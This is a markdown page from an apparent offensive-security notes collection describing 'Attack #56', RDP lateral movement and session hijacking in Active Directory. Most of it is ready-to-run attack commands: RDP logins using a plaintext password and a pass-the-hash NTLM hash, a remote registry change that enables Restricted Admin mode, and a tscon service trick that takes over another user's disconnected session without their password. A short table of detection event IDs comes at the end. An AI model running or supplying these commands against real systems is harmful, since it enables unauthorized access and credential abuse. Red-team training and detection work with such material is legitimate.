---
title: "Attack #56 — RDP Lateral Movement and Hijacking"
description: "RDP (Remote Desktop Protocol, port 3389) provides full GUI access to remote systems. Beyond standard RDP with credentials, attackers can hijack existing…"
category: active-directory
subcategory: "Lateral Movement"
tags: ["active-directory", "lateral-movement", "hashing"]
tools: ["NetExec", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #56 — RDP Lateral Movement and Hijacking.md"
---
# ⚫ Attack #56 — RDP Lateral Movement & Hijacking

***

## 📖 How It Works

RDP (Remote Desktop Protocol, port 3389) provides full GUI access to remote systems. Beyond standard RDP with credentials, attackers can **hijack existing disconnected sessions** (session stealing) from a SYSTEM context without knowing the user's password — using `tscon.exe` to switch to another user's session.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Valid credentials or PtH** | For standard RDP |
| **SYSTEM access on target** | For session hijacking |
| **RDP enabled** | Port 3389 open |

***

## 💻 Full Commands

### 🔴 Standard RDP

```bash
# ── From Linux ────────────────────────────────────────────────────────────────
xfreerdp /u:Administrator /p:'Password1' /v:10.10.10.10 /cert-ignore /dynamic-resolution

# ── PtH with RDP (Restricted Admin mode required) ────────────────────────────
xfreerdp /u:Administrator /pth:2b576acbe6bcfda7294d6bd18041b8fe /v:10.10.10.10

# ── Enable Restricted Admin (for PtH to work) ────────────────────────────────
nxc smb 10.10.10.10 -u Administrator -H <hash> -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
```

### 🔴 RDP Session Hijacking

```powershell
# ── As SYSTEM, list active sessions ───────────────────────────────────────────
query user
# USERNAME    SESSIONNAME   ID    STATE
# admin_user  rdp-tcp#1     2     Disconnected  ← target this

# ── Hijack disconnected session (as SYSTEM, no password needed) ───────────────
# Create service to run tscon as SYSTEM:
sc create sesshijack binPath= "cmd.exe /c tscon 2 /dest:console"
net start sesshijack
# Or directly as SYSTEM:
tscon 2 /dest:console
# You are now in admin_user's RDP session
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 10 (RemoteInteractive) |
| **4778** | Security Log | Session reconnected — session hijacking indicator |
| **4779** | Security Log | Session disconnected |
| **1149** | TerminalServices-RemoteConnectionManager | Remote connection established |

***

> ✅ **Attack #56 — RDP Lateral Movement complete.**
